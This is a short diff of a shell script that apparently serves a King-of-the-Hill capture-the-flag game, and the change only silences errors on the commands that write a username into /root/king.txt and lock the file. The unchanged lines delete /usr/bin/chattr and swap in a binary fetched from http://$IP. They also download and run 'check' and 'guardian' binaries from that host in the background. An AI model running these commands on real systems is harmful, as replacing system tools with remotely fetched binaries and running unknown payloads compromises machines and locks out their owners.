@@ -24,11 +24,11 @@ sudo chmod -s /usr/bin/pkexec
 rm -rf /usr/bin/chattr
 cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
 set write off
-sudo chattr -ai /root/king.txt
-echo "$username" > /root/king.txt
-sudo chmod 400 /root/king.txt
-sudo chattr +ai /root/king.txt
-sudo mount --bind -o ro /root/king.txt /root/king.txt
+sudo chattr -ai /root/king.txt 2>/dev/null
+echo "$username" > /root/king.txt 2>/dev/null
+sudo chmod 400 /root/king.txt 2>/dev/null
+sudo chattr +ai /root/king.txt 2>/dev/null
+sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 
 cd /usr/bin && wget http://$IP/check && chmod +x check && ./check "$username" &
 cd /usr/bin && wget http://$IP/guardian && chmod +x guardian && ./guardian "$IP" &
